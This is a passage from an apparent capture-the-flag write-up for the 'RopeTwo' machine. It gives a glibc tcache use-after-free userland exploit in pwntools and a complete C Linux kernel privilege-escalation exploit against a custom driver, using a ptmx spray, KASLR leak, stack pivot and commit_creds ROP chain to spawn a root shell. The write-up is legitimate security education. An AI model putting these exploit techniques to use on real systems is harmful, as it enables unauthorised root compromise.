edit, pretty expected coming from heap challenge, for most part the vulnerability always seem to have in edit functionality provided by the binary. In this case, the vulerability arises from the use of the function realloc, for this if we refer to man pages, we can see how this was the point of the vulnerability:-\nThe realloc() function changes the size of the memory block pointed to by ptr to size bytes. The contents will be unchanged in the range from the start of the region up to the minimum of the old and new sizes. If the new size is larger than the old size, the added memory will not be initialized. If ptr is NULL, then the call is equivalent to mal‐ loc(size), for all values of size; if size is equal to zero, and ptr is not NULL, then the call is equivalent to free(ptr). Unless ptr is NULL, it must have been returned by an earlier call to malloc(), cal‐ loc(), or realloc(). If the area pointed to was moved, a free(ptr) is done.\nDid you notice? Yes, calling ralloc(0, \u0026amp;chunk) is basically calling free(\u0026amp;chunk), this is the cue, we have a Use After Free vulnerability in the edit function. Since there\u0026rsquo;s no check for the size being 0, as it only checks whether the given size is the within 0x70 this made the use of realloc function vulnerable here, making this the way to exploit the binary.\nFor this challenge, it would have been lot more easier if we had the GLIBC 2.27 instead of the GLIBC 2.29, since GLIBC 2.27 instroduced the tcache mechanism to a greater range of users and systems, it had quit a lot amount of flaw in the use of tcache which made them suspectible to vulnerabilites like double free, but as the vulnerabilities got reported, this resulted in some major change sin the LIBC 2.29, with the following security mechanism but not only limited to those:-\nAdded checks for the double free which made it harder to propogate this vulnerability. Increase in assertion check of the size. Unsorted bin attack is not easy applicable. Although, we don\u0026rsquo;t have to deal with the Unsorted bin attack, and with the added checks for the double free, it makes the challenge much more difficult, making for us to bang our heads more than we already been doing.\nWe have to deal with the checks for the double free, which we will see later on.\nThe functions responsible for placing and retrieving the chunks out of the tcache are as follows:-\nstatic __always_inline void * tcache_get (size_t tc_idx) { tcache_entry *e = tcache-\u0026gt;entries[tc_idx]; assert (tc_idx \u0026lt; TCACHE_MAX_BINS); assert (tcache-\u0026gt;entries[tc_idx] \u0026gt; 0); tcache-\u0026gt;entries[tc_idx] = e-\u0026gt;next; --(tcache-\u0026gt;counts[tc_idx]); e-\u0026gt;key = NULL; return (void *) e; } static __always_inline void tcache_put (mchunkptr chunk, size_t tc_idx) { tcache_entry *e = (tcache_entry *) chunk2mem (chunk); assert (tc_idx \u0026lt; TCACHE_MAX_BINS); /* Mark this chunk as \u0026#34;in the tcache\u0026#34; so the test in _int_free will detect a double free. */ e-\u0026gt;key = tcache; e-\u0026gt;next = tcache-\u0026gt;entries[tc_idx]; tcache-\u0026gt;entries[tc_idx] = e; ++(tcache-\u0026gt;counts[tc_idx]); } As you can see, from this there are no checks for double free, on the other hand, since the target system has the GLIBC 2.29 and above code snippet has a check for double since there\u0026rsquo;s a use of e-\u0026gt;key for the chunk, this made the challenge harder than usual.\nFirst off, with the complication of the binary, we will try to do this with the ASLR off, to get the basic understanding of the exploit, then using it as base, we will proceed with it. In order to get over the workflow of heap management, I\u0026rsquo;d advise you to go through following links:-\nhttps://github.com/D4mianWayne/PwnLand/blob/master/Heap/GLIBC%202.27/tcache-overview.md https://jjy-security.tistory.com/10\u0026prev=search\u0026pto=aue Now, considering you have basic understanding of the tcache management, with that on our skill set, let\u0026rsquo;s move on to write the wrapper functions to interact with the binary\u0026rsquo;s functionalities:-\ndef allocate(name, size, content): p.sendlineafter(\u0026#34;$ \u0026#34;, \u0026#34;add {}\u0026#34;.format(name)) p.sendlineafter(\u0026#34;: \u0026#34;, str(size)) if len(content) == size: p.sendafter(\u0026#34;: \u0026#34;, content) else: p.sendlineafter(\u0026#34;: \u0026#34;, content) def free(name): p.sendlineafter(\u0026#34;$ \u0026#34;, \u0026#34;rm {}\u0026#34;.format(name)) def realloc(name, size, content=None): p.sendlineafter(\u0026#34;$ \u0026#34;, \u0026#34;edit {}\u0026#34;.format(name)) p.sendlineafter(\u0026#34;: \u0026#34;, str(size)) if content: p.sendafter(\u0026#34;: \u0026#34;, content) Now, with this aside, we will now move on the actual exploitation part, I\u0026rsquo;d say pay attention here as much as possible as the initial ideologyof the exploit is very confusing, but as you move on, you\u0026rsquo;ll understand.\nFor starting, we will allocate and free chunk 1:-\nallocate(0, 0x48, \u0026#34;A\u0026#34;) free(0) Now, this will land into the tcache bin:-\nSince, we know that calling realloc(0, chunk) will be just free(chunk), we will allocate a chunk of size 0x68 and then do realloc(0, chunk_2) where chunk_2 represent the chunk we allocated of size 0x68.\nallocate(0, 0x68, \u0026#34;A\u0026#34;) realloc(0, 0, \u0026#34;\u0026#34;) Doing so,\nAs you can see, it is not removed from the global array which is used to store the information about the allocated chunk and size, located at base + 0x4060. Now, moving on, we re-allocate the same chunk at the index 0 but we shrink the size from the 0x68 which was free\u0026rsquo;d earlier, and now we update the size to 0x18, then we free it a\nrealloc(0, 0x18, \u0026#34;A\u0026#34;) free(0) Now, doing so, we have the same heap chunk at the tcache index 0 as well as on index 5.\nNow, the same chunk reside in different indices, the reason that happened because first off, we allocated chunk of size 0x68, then we free\u0026rsquo;d it with the realloc(0, 0, \u0026quot;\u0026quot;) this free'd the region but the global pointer was not NULL, so when we do realloc(0, 0x18, \u0026quot;A\u0026quot;), this made the chunk which was free\u0026rsquo;d before, making the free\u0026rsquo;d chunk being used and it ended up being reduced to the size 0x18, so when we free it again, the chunk will land into the different index of the tcache bin.\nNow, we allocate another chunk of size 0x48, then we free it again using the realloc:-\nallocate(0, 0x48, \u0026#34;B\u0026#34;) realloc(0, 0, \u0026#34;\u0026#34;) Doing so, the heap structure turned out to be:-\nThen, we realloc the same chunk as of the same size it was allocated to:-\nrealloc(0, 0x48, \u0026#34;B\u0026#34;*0x10) free(0) Now:-\ngef➤ heap bins ────────────────────────────────── Tcachebins for arena 0x7ffff7fbbc40 ────────────────────────────────── Tcachebins[idx=0, size=0x20] count=1 ← Chunk(addr=0x5555555592b0, size=0x20, flags=PREV_INUSE) Tcachebins[idx=3, size=0x50] count=3 ← Chunk(addr=0x5555555592d0, size=0x50, flags=PREV_INUSE) ← Chunk(addr=0x5555555592d0, size=0x50, flags=PREV_INUSE) → [loop detected] Tcachebins[idx=5, size=0x70] count=1 ← Chunk(addr=0x5555555592b0, size=0x20, flags=PREV_INUSE) Now, the global pointer is also cleared gsssef➤ x/10xg 0x0000555555554000 + 0x4060 0x555555558060:\t0x0000000000000000\t0x0000000000000000 0x555555558070:\t0x0000000000000000\t0x0000000000000000 Playing close attention here, the bin at the index 3, has now an entry pointing to itself, as shown by the gef. This aside, now we will allocate at chunk of size 0z48 which will be retrieved from the index 3, giving the address 0x5555555592d0, since the chunk would still be in the same bin because of the duplicate entry. Now, we will re-allocate a chunk of size 0x68 at the index 1, this will retrieve from the index 5 of the tcache bin list, since the same chunk 0x5555555592b0 is in two different indices, we write the payload \u0026quot;C\u0026quot;*0x18 + p64(0x451), As the difference between the chunk at index 3 and index 5 of tcache is 0x20, we will overwrite the prev_size to 0x451, this made the heap structure like this:-\nallocate(0, 0x48, \u0026#34;C\u0026#34;) allocate(1, 0x68, b\u0026#34;C\u0026#34;*0x18+p64(0x451)) Once we free the chunk, the chunk at the index 1, it\u0026rsquo;ll be:-\nfree(1) Now, we need to at least fill a certain index of the tcache bins in such a way that the chunk we free after filling the tcache lands into the fastbin. Now, the way we fill the tcache here is by allocating the chunk at the index 1, and then reallocating the same chunk by extending the size to a much bigger value and then free\u0026lsquo;ing the chunk.\nfor i in range(9): allocate(1, 0x58, \u0026#34;D\u0026#34;) realloc(1, 0x70, \u0026#34;D\u0026#34;) free(1) Doing so, the tcache bin structure becomes:-\nThen, we allocate a chunk of size 0x58 which will retrieve the chunk from the tcache bin[3]. Now, what we do here is free the chunk saved at the index 1, then the chunk which was allocated at the index 0 of the global array, we free it with the realloc, now doing so, since the chunk at that index had the size 0x451 which is more than the tcache structure can hold, this will make them land into the unsorted bin.\nallocate(1, 0x58, \u0026#34;A\u0026#34;) free(1) realloc(0, 0, \u0026#34;\u0026#34;) Now, doing so, the chunk 0x5555555592d0 went into the unsorted bin, this chunk remain in the tcache and the unsorted bin:-\nNow, since the chunk belongs to unsorted bin, we can edit the fd and bk of it because of the Use After Free\u0026amp;, now then, as there\u0026rsquo;s no show function, we populate the fd of that free\u0026rsquo;d chunk in the _IO_2_1_stdout_ and the next time, we allocate the chunk, we will get the structure of the _IO_2_1_stdout_ which we will be able to modify.\nrealloc(0, 0x38, p16(0xc760)) # ASLR disabled Now, we have to allocate chunk carefully since at this point the structure of the heap is not very good, doing anything reckless will mess up the exploit further. Now, what we do is again, allocate a chunk at the index 1, then reallocate the same chunk by shrinking it\u0026rsquo;s size to smaller than it was allocate to, and free\u0026lsquo;ing it, now, when we try to reallocate the chunk 0, to a more smaller size and then free it, doing so, will make the _IO_2_1_stdout_ address to the top of the index 3rd of the tcache bin list:-\nallocate(1, 0x48, \u0026#34;E\u0026#34;) realloc(1, 0x18, \u0026#34;E\u0026#34;) free(1) realloc(0, 0x18, \u0026#34;E\u0026#34;*0x10) free(0) Now, apparently explaining the structure of the _IO_2_1_stdout_ is too much hassle in this already long writeup, so I\u0026rsquo;ll add the references link below for understanding the structure. Now, what we do here is allocate a chuk at the index 0 with the size 0x48, which will return the chunk stored from the bin[3], the given data will be written to the address pointed by the chunk, whhich would look likt his:-\nallocate(0, 0x48, p64(0xfbad1800)+p64(0)*3) After a puts call, there was lot of addresses dumped to the stdout, which was bit too much, this made it hard to get an exact lLIBC leak, this problem was with the ASLR off, which, in turn ran with the bruteforce works perfectly normal. So, for the ASLR off part, the leak parsing was something like this:-\nleak = p.recv(0xe20 + 0x10)[0xe20 + 0x5:0xe20 + 0x5 + 6] leak = u64(leak.ljust(8, b\u0026#34;\\x00\u0026#34;)) #+ 0x197a000 leak = int(hex(leak), 16) log.info(\u0026#34;LEAK: 0x%x\u0026#34; %(leak)) libc.address = leak + 0x197f000 #0x1b2634 log.info(\u0026#34;LIBC: 0x%x\u0026#34; %(libc.address)) log.info(\u0026#34;LIBC: 0x%x\u0026#34; %(libc.address)) log.info(\u0026#34;__free_hook: 0x%x\u0026#34; %(libc.sym[\u0026#39;__free_hook\u0026#39;])) p.sendline(\u0026#34;\u0026#34;) # Fix the buffer of thr program Now, what we do is, allocate at the chunk 1 with size 0x70 and then free it with the use of the realloc, this will push the chunk on the tcache bin list, now we again reallocate the same chunk by shrinking it\u0026rsquo;s size to the 0x18, then we allocate the chunk of the same size earlier and edit the fd of the next adjacent chunk to the __free_hook - 0x8 and made the size to the 0x41 which will make it belong to bin of size 0x50. Then we free the chunk 1.\nallocate(1, 0x70, \u0026#34;F\u0026#34;) realloc(1, 0, \u0026#34;\u0026#34;) realloc(1, 0x18, \u0026#34;F\u0026#34;*0x10) free(1) allocate(1, 0x70, b\u0026#34;F\u0026#34;*0x18+p64(0x41)+p64(libc.sym[\u0026#34;__free_hook\u0026#34;] - 0x8)) free(1) Now, we retrieve the chunk and overwrite the free_hook with the system:\nallocate(1, 0x58, \u0026#34;G\u0026#34;) realloc(1, 0x28, \u0026#34;G\u0026#34;) free(1) allocate(1, 0x58, b\u0026#34;/bin/sh\\x00\u0026#34; + p64(libc.sym[\u0026#39;system\u0026#39;])) Now, we invoke the __free_hook by calling the rm function:-\np.sendlineafter(\u0026#34;$ \u0026#34;, \u0026#34;rm 1\u0026#34;) p.interactive() The final script for the remote server can be found here\nRunning the remote exploit, since ASLR was enabled on the server, we have to bruteforce the last 4 bytes of the _IO_2_1_stdout_, in my case I had the issue with the LIBC leak, with the help of the FizzBuzz, using the last bytes as p16(0x2760), doing that so and running the exploit in while loop, I got the shell with 40-60 tries:-\nIssue, after getting the shell as the user r4j, I couldn\u0026rsquo;t read the user.txt which was because of the groups I belonged, using the newgrp and leveraging to the r4j group, I was able to read the user flag.\nRoot #Now, being the user r4j didn\u0026rsquo;t really gave much away with basic enumeration and as I knew that the fact of the root part being the kernel, I went in and checked for the /dev/ to look for any suspicious driver, in this case the only thing that stood out more than the other was, ralloc.\nAttachment: The files for root exploitation can be found here.\nOne way I found about the ralloc custom LKM was with the help of dmesg, which showed the follwing message:-\nNow, that showed, we have the ralloc, although to start off with the exploitation or even knowing the workflow of this module, I needed to get the ralloc.ko, doing locate ralloc.ko, the file was located at /usr/lib/modules/5.0.0-38-generic/kernel/drivers/ralloc/ralloc.ko which is the default path where kernel modules are stored. Then checking for the kernel version:-\nLinux rope2 5.0.0-38-generic #41-Ubuntu SMP Tue Dec 3 00:27:35 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux Kernel Exploitation #There was no publically available CVE for this version of kernel, what left was to dissect the binary and try to understand the workflow and look for any vulnerable part. I am more fan of IDA than of Ghidra, but then again it\u0026rsquo;s just personal preference, at the end you\u0026rsquo;ll have the overall idea. So, moving on, let\u0026rsquo;s reverse engineer the binary and see what the binary really does:-\nNow, using the IDA and cleaning up the code a lot, there were 3 functions, in which the rope2_ioctl was one of the functions which was most interesting, the other 2 being rope2_init and rope2_exit are there to handle the intialization and exit operation for the modules, aside from those, the function we need to really focus on was the rope2_ioctl which was as follows:-\nThe development of the exploit is done on the QEMU instance which can be foind at the above attached link. KASLR has been off for the debugging purpose but it is enabled on the RopeTwo machine. First off, there were four options one could invoke, which were as follows:-\ncase 0x1000: heap.size = *\u0026amp;request.size; if ( *\u0026amp;request.size \u0026lt;= 0x400uLL \u0026amp;\u0026amp; request.index \u0026lt;= 0x1F ) { heap.chunk = (\u0026amp;arr + 16 * request.index); if ( !heap.chunk[1] ) { chunk = _kmalloc(*\u0026amp;request.size, 0x6000C0LL); heap.chunk[1] = chunk; if ( chunk ) { *heap.chunk = heap.size + 32; return_value = 0LL; goto exit; } } } goto jump_to_exit; The first option, here which can be invoked by giving the 0x1000 as option, which we will see later on how we will interact with it, here it takes the two options, index and the other being size on the basis of that, it will allocate the chunk on the kernel heap with the kmalloc and save it on the global array with the index given, the upmost index that we could allocate to is 0x1F and accepted size is \u0026lt;= 0x400.\ncase 0x1001: if ( request.index \u0026lt;= 0x1F ) { index = 2LL * request.index; array_1 = \u0026amp;arr + index * 8; if ( heap_list[index] ) { kfree(); *(array_1 + 1) = 0LL; return_value = 0LL; goto exit; } } goto jump_to_exit; The option 0x1001 here is used to invoke a function which only takes index as the option and then checks if the index exist or not, on the basis of that it calls kfree and release the allocated chunk.\ncase 0x1002: heap2.chunk = request.buf; if ( request.index \u0026lt;= 0x1F ) { heap1.index = 2LL * request.index; heap1.chunk = heap_list[heap1.index]; heap1.size = (\u0026amp;arr + heap1.index * 8); if ( heap1.chunk ) { memcpy_size = request.size; if ( request.size \u0026lt;= *heap1.size \u0026amp;\u0026amp; !(request.buf \u0026amp; 0xFFFF000000000000LL) ) goto memcpy_jump; } } jump_to_exit: return_value = -1LL; goto exit; } The option was used to write to an allocated region, it takes the index, the size and the pointer to the buffered region.\nif ( choice != 0x1003 ) goto jump_to_exit; heap1.chunk = request.buf; if ( request.index \u0026gt; 0x1F ) goto jump_to_exit; heap2.index = 2LL * request.index; heap2.chunk = heap_list[heap2.index]; heap2.size = (\u0026amp;arr + heap2.index * 8); if ( !heap2.chunk ) goto jump_to_exit; memcpy_size = request.size; if ( *heap2.size \u0026lt; request.size || request.buf \u0026amp; 0xFFFF000000000000LL ) goto jump_to_exit; memcpy_jump: memcpy(heap1.chunk, heap2.chunk, memcpy_size); return_value = 0LL; exit: mutex_unlock(\u0026amp;lock); return return_value; } This function was used to interact in order to read from the allocated region, this takes the index, size and the pointer to the buffer where the contents from the allocated region will be copied, this pointer would from the userland region.\nSummarsing the code, we conclude it to:-\n0x1000: Allocate function which takes index and size. 0x1001: Free function which takes the index. 0x1002: Write function which takes the index size and data to be written. 0x1003: Read function which takes index, size and the data where the contents of the chunk would be read. We can only allocate chunks upto to 0x1F times. So, where does the vulnerabilit exists? It exists in the function 0x1000 which is used for allocation, now let\u0026rsquo;s see where it was:-\nchunk = _kmalloc(*\u0026amp;request.size, 0x6000C0LL); heap.chunk[1] = chunk; if ( chunk ) { *heap.chunk = heap.size + 32; return_value = 0LL; goto exit; The structure of the heap can be considered as:\nstruct heap { int size; char *buf; } // This is not accurate, it\u0026#39;s here just for the explaination If you pay close attention to the heap.size + 32, well considering how the heap structure here is, there\u0026rsquo;s an extra 32 bytes added to it. This in turn, allowed us to write 32 bytes more than size of an allocated chunk, same as for read, we can read extra 32 bytes than the chunk\u0026rsquo;s actual size. So, conlcuding, we have 32 byte extra overflow for read/write. Now, the question arises, how exactly we interact with the service, to do so, I used ioctl to interact with it, the following functions I created:-\nstruct message { unsigned int index; long size; char *buf; }; void kmalloc(int fd, unsigned long idx, unsigned long size) { struct message msg; msg.size = size; msg.index = idx; printf(\u0026#34;[*] Allocating Chunk at: %ld of size: %ld\\n\u0026#34;, idx, size); if (ioctl(fd, 0x1000, \u0026amp;msg) == -1) { puts(\u0026#34;Error!!\u0026#34;); exit(1); } } void kfree(int fd, unsigned long idx) { struct message msg; msg.index = idx; printf(\u0026#34;[*] Free\u0026#39;ng index: %ld\\n\u0026#34;, idx); if (ioctl(fd, 0x1001, \u0026amp;msg) == -1) { puts(\u0026#34;Error!!\u0026#34;); exit(1); } } void fill(int fd, unsigned long idx, unsigned int size, char *ptr) { struct message msg; msg.buf = ptr; msg.index = idx; msg.size = size; printf(\u0026#34;[*] Filling Chunk at Index: %ld with %s\\n\u0026#34;, idx, ptr); if (ioctl(fd, 0x1002, \u0026amp;msg) == -1) { puts(\u0026#34;Error!!\u0026#34;); exit(1); } } void get(int fd, unsigned long idx, unsigned long size, char *ptr) { struct message msg; msg.index = idx; msg.size = size; msg.buf = ptr; printf(\u0026#34;[*] Reading data from index: %ld\\n\u0026#34;, idx); if (ioctl(fd, 0x1003, \u0026amp;msg) == -1) { puts(\u0026#34;Error!!\u0026#34;); exit(1); } } The *.cpio file could be compiled with find . | cpio -H newc -ov -F ../initramfs.cpio\nFor the experimentation, I made a QEMU instance of the Linux Kernel 5.0.-38 with the ralloc.ko as a module loaded to it upon starting, which I uploaded to the github, linked above, try it yourself.\nThe question we end up at last at exactly how are we supposed to exploit this heap overflow which only gives us the extra 32 bytes to do read/write. Upon the extensive research, I found this blog post by ptr-yudai, which if translated to the english stated as follows:-\nSize : 0x2e0 (kmalloc-1024) base : ops the ptm_unix98_ops leak possible because it refers to. Besides that, it pointed to the data area of ​​the kernel in about two places. Heap : dev, driverleak possible because like many of the object is pointing to the members of the heap and own. The target SLUB has not been investigated. **stack** : I can't seem to leak. **Secure** :/dev/ptmxOpen. **Release** : Close the openptmx. **Remarks** : ops` RIP can be controlled by rewriting. Reference : https://elixir.bootlin.com/linux/v4.19.98/source/include/linux/tty.h#L283\nConsidering the above, I then focused on a writeup wrote by the same author for the challenge he created, which can be found here, this if try to compare from the ralloc, the initial methodology seems to be same.\nApparently, going in-depth on why this /dev/ptmx is the best target would be better for a seperate post itself, so I am leaving the unncessary part in this challenge context and will explain the things as we move on. To replicate the same methodology to get the RIP control, firstly I allocated a chunk of size 0x400 which was the meximun size the ioctl can allocate the chunk of and I also opened the ptmx device.\nI turned off the KASLR on the QEMU instance and already got the address of the function we needed:-\ncommit_creds ptm_unix98_ops prepare_kernel_creds int main() { unsigned long buf[0x420 / sizeof(unsigned long)]; /* open drivers */ int fd = open(\u0026#34;/dev/ralloc\u0026#34;, O_RDONLY); if (fd \u0026lt; 0) { perror(\u0026#34;/dev/ralloc\u0026#34;); return 1; } for(int i=0; i\u0026lt;0x100; i++) { spray_fd[i] = open(\u0026#34;/dev/ptmx\u0026#34;, O_RDWR | O_NOCTTY); } kmalloc(fd, 0, 0x400); get(fd, 0, 0x420, \u0026amp;buf); return 0; } Now, doing so, upon setting up a breakpoint at the rope2_ioctl\u0026rsquo;s kmalloc call and stepping to it, we see the heap structure as:-\nNote: Before debugging do: add-symbol-file ralloc.ko 0xffffffffc0002000 in the gdb-gef.\nThen, moving on, setup a breakpoint at the b *rope2_ioctl + 342 and then running the program, once it hits the breakpoint, when we see the memory:-\nNow, considering that, if we see for the memory content, the ptm_unix98_ops object was at heap.size + 32, since heap.size was 0x400, the ptm_uniz98_ops was at the 0x420. Using the get function, we can have the leak:-\nNow, since we have a leak, this will be useful in retrieving the base address to calculate the address of the function and gadget we will need, for now, since the structure as defined, if we can overwrite the *ops with the help of the fake tty_operations array created from the userland, we can have the RIP control.\nThe POC for tty_struct and RIP control can be understood from here: https://www.lazenca.net/pages/viewpage.action?pageId=29327365#id-07.Use-After-Free(UAF)(feat.tty_struct)-PoCcode\nNow compiling the exploit:-\nunsigned long kbase, kheap; unsigned long ptm_unix98_ops = 0x10af6a0; unsigned long pop_rdi, kpti; unsigned long init_creds = 0x165fa00; unsigned long commit_creds = 0xc0540; void *fake_tty_operations[30]; int spray_fd[0x100]; //[..snip..] int main() { unsigned long buf[0x420 / sizeof(unsigned long)]; /* open drivers */ int fd = open(\u0026#34;/dev/ralloc\u0026#34;, O_RDONLY); if (fd \u0026lt; 0) { perror(\u0026#34;/dev/ralloc\u0026#34;); return 1; } for(int i=0; i\u0026lt;0x100; i++) { spray_fd[i] = open(\u0026#34;/dev/ptmx\u0026#34;, O_RDWR | O_NOCTTY); } kmalloc(fd, 0, 0x400); get(fd, 0, 0x420, \u0026amp;buf); kbase = buf[131] - ptm_unix98_ops; printf(\u0026#34;[*] Leak : %p\\n\u0026#34;, buf[131]); if (buf[131] \u0026amp; 0xfff != 0x6a0) { printf(\u0026#34;[!] Error, exploit failed.\\n\u0026#34;); exit(-1); } printf(\u0026#34;[*] Base : %p\\n\u0026#34;, kbase); printf(\u0026#34;[*] Gadget : %p\\n\u0026#34;, kbase + 0xb55c7); commit_creds = kbase + commit_creds; init_creds = kbase + init_creds; pop_rdi = kbase + 0x8b8a0; // pop rdi; ret kpti = kbase + 0xc00a34; // swapgs_restore_regs_and_return_to_usermode printf(\u0026#34;[*] init_creds: %p\\n\u0026#34;, init_creds); printf(\u0026#34;[*] commit_creds : %p\\n\u0026#34;, commit_creds); printf(\u0026#34;[*] get_shell : %p\\n\u0026#34;, \u0026amp;get_shell); printf(\u0026#34;[!] DEBUG....:\u0026#34;); getchar(); fake_tty_operations[12] = 0xdeadbeef; buf[131] = \u0026amp;fake_tty_operations; fill(fd, 0, 0x420, \u0026amp;buf); for(int i=0; i\u0026lt;0x100; i++) { ioctl(spray_fd[i], 0, 0); } return 0; } Doing the above, we get the RIP overwritten as 0xdeadbeef.\nNow, moving on, we will have to somehow execute the ROP chain which will be commit_creds(init_creds()), and call a function which will spawn shell. As for my initial research, I found out that we can use a gadget like xchg eax, esp and mmap a memory region with the lower 32 bit address of the gadget and store our ROP chain to it, which once the RIP hits the gadget, would exchange the eax and esp would execute instructions from the mmap\u0026rsquo;d region. To do this, I change the 12th index of the fake_tty_operations to the address of the xchg eax, esp gadget and set a breakpoint at the address within gdb:\nThe gadget was found with the help of ROPGadget and is from the .text section because of r/w permissions. `\nfake_tty_operations[12] = kbase + 0x4cba4; buf[131] = \u0026amp;fake_tty_operations; fill(fd, 0, 0x420, \u0026amp;buf); for(int i=0; i\u0026lt;0x100; i++) If we step into the instruction and see the values of both eax \u0026amp; esp, we will see:-\nAs seen above, the rsp is now pointing to the loweer 32 bit address of the gadget, now, we can mmap a shared memory page such that it\u0026rsquo;ll be accessible between the kernel and the userland space with:-\nvoid *mapped = mmap(pivot_target \u0026amp; 0xfffff000, 0x1000000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE | MAP_POPULATE, 0, 0); Now, time to craft a ROP chain which will be stored in the shared memory region, following is the ROP chain I created:-\nunsigned long long user_rflags, user_cs, user_ss, user_sp; asm volatile( \u0026#34;mov %0, %%cs\\n\u0026#34; \u0026#34;mov %1, %%ss\\n\u0026#34; \u0026#34;mov %2, %%rsp\\n\u0026#34; \u0026#34;pushfq\\n\u0026#34; \u0026#34;pop %3\\n\u0026#34; : \u0026#34;=r\u0026#34; (user_cs), \u0026#34;=r\u0026#34; (user_ss), \u0026#34;=r\u0026#34; (user_sp), \u0026#34;=r\u0026#34; (user_rflags) ); unsigned long long rop[] = { pop_rdi, // pop rdi init_creds, commit_creds, swapgs, 0xdeadbeef, iretq, get_shell, user_cs, user_rflags, user_sp, user_ss, }; Now, to explain the ROP chain, let\u0026rsquo;s break down:-\npop rdi; ret this will pop the rdi register which is responsible for holding the 1st arguument in the x86_64 systems. init_creds: This will be given into the rdi. commit_creds, doing so, when the the RIP will reach the commit_creds, it\u0026rsquo;ll execute it as commit_creds(init_creds()) which will change the UID for the running process to 0. Then, swapgs will let the it back to the userland safely because of the SMAP and KASLR being enabled, then 0xdeadbeef for the padding. iretq will store the the flags and register and the RIP. Followed by the get_shell function, this will be the RIP. Rest flags would be restored and will be considered. Now, the final exploit looks like this:-\n#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;sys/wait.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;sys/syscall.h\u0026gt; #include \u0026lt;sys/mman.h\u0026gt; #include\u0026lt;linux/userfaultfd.h\u0026gt; #include \u0026lt;sys/timerfd.h\u0026gt; #include \u0026lt;pthread.h\u0026gt; #include \u0026lt;poll.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/ioctl.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; unsigned long kbase, kheap; unsigned long ptm_unix98_ops = 0x10af6a0; unsigned long pop_rdi, kpti; unsigned long init_creds = 0x165fa00; unsigned long commit_creds = 0xc0540; void *fake_tty_operations[30]; int spray_fd[0x100]; struct message { unsigned int index; long size; char *buf; }; void kmalloc(int fd, unsigned long idx, unsigned long size) { struct message msg; msg.size = size; msg.index = idx; printf(\u0026#34;[*] Allocating Chunk at: %ld of size: %ld\\n\u0026#34;, idx, size); if (ioctl(fd, 0x1000, \u0026amp;msg) == -1) { puts(\u0026#34;Error!!\u0026#34;); exit(1); } } void kfree(int fd, unsigned long idx) { struct message msg; msg.index = idx; printf(\u0026#34;[*] Free\u0026#39;ng index: %ld\\n\u0026#34;, idx); if (ioctl(fd, 0x1001, \u0026amp;msg) == -1) { puts(\u0026#34;Error!!\u0026#34;); exit(1); } } void fill(int fd, unsigned long idx, unsigned int size, char *ptr) { struct message msg; msg.buf = ptr; msg.index = idx; msg.size = size; printf(\u0026#34;[*] Filling Chunk at Index: %ld with %s\\n\u0026#34;, idx, ptr); if (ioctl(fd, 0x1002, \u0026amp;msg) == -1) { puts(\u0026#34;Error!!\u0026#34;); exit(1); } } void get(int fd, unsigned long idx, unsigned long size, char *ptr) { struct message msg; msg.index = idx; msg.size = size; msg.buf = ptr; printf(\u0026#34;[*] Reading data from index: %ld\\n\u0026#34;, idx); if (ioctl(fd, 0x1003, \u0026amp;msg) == -1) { puts(\u0026#34;Error!!\u0026#34;); exit(1); } } void get_shell() { printf(\u0026#34;is system?\\n\u0026#34;); char *shell = \u0026#34;/bin/sh\u0026#34;; char *args[] = {shell, NULL}; execve(shell, args, NULL); } int main() { unsigned long buf[0x420 / sizeof(unsigned long)]; /* open drivers */ int fd = open(\u0026#34;/dev/ralloc\u0026#34;, O_RDONLY); if (fd \u0026lt; 0) { perror(\u0026#34;/dev/ralloc\u0026#34;); return 1; } for(int i=0; i\u0026lt;0x100; i++) { spray_fd[i] = open(\u0026#34;/dev/ptmx\u0026#34;, O_RDWR | O_NOCTTY); } /* leak kbase \u0026amp; kheap */ //int ptmx = open(\u0026#34;/dev/ptmx\u0026#34;, O_RDWR | O_NOCTTY); kmalloc(fd, 0, 0x400); get(fd, 0, 0x420, \u0026amp;buf); kbase = buf[131] - ptm_unix98_ops; buf[19] = 0xdeadbeef; printf(\u0026#34;[*] Leak : %p\\n\u0026#34;, buf[131]); printf(\u0026#34;[*] Base : %p\\n\u0026#34;, kbase); printf(\u0026#34;[*] Gadget : %p\\n\u0026#34;, kbase + 0xb55c7); commit_creds = kbase + commit_creds; init_creds = kbase + init_creds; pop_rdi = kbase + 0x8b8a0; // pop rdi; ret unsigned long mov_rdi_rax = kbase + 0xffffffff813153bc - 0xffffffff81000000; printf(\u0026#34;[*] init_creds: %p\\n\u0026#34;, init_creds); printf(\u0026#34;[*] commit_creds : %p\\n\u0026#34;, commit_creds); printf(\u0026#34;[*] get_shell : %p\\n\u0026#34;, \u0026amp;get_shell); printf(\u0026#34;[!] DEBUG....:\u0026#34;); getchar(); fake_tty_operations[12] = kbase + 0x4cba4; buf[131] = \u0026amp;fake_tty_operations; unsigned long iretq = kbase + 0xffffffff810379fb - 0xffffffff81000000; unsigned long swapgs = kbase + 0xffffffff81074b54 - 0xffffffff81000000; unsigned long pivot_target = kbase + 0x4cba4 \u0026amp; 0xffffffff; unsigned long *fake_stack = \u0026amp;pivot_target; void *mapped = mmap(pivot_target \u0026amp; 0xfffff000, 0x1000000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE | MAP_POPULATE, 0, 0); printf(\u0026#34;mmap\u0026#39;d chunk: %p\\n\u0026#34;, mapped); printf(\u0026#34;pivot_target: %p\\n\u0026#34;, pivot_target); unsigned long prepare_kernel_creds = kbase + 0xc07a0; unsigned long long user_rflags, user_cs, user_ss, user_sp; asm volatile( \u0026#34;mov %0, %%cs\\n\u0026#34; \u0026#34;mov %1, %%ss\\n\u0026#34; \u0026#34;mov %2, %%rsp\\n\u0026#34; \u0026#34;pushfq\\n\u0026#34; \u0026#34;pop %3\\n\u0026#34; : \u0026#34;=r\u0026#34; (user_cs), \u0026#34;=r\u0026#34; (user_ss), \u0026#34;=r\u0026#34; (user_sp), \u0026#34;=r\u0026#34; (user_rflags) ); unsigned long long rop[] = { pop_rdi, // pop rdi init_creds, commit_creds, swapgs, 0xdeadbeef, iretq, get_shell, user_cs, user_rflags, user_sp, user_ss, }; memcpy((void *)(kbase + 0x4cba4 \u0026amp; 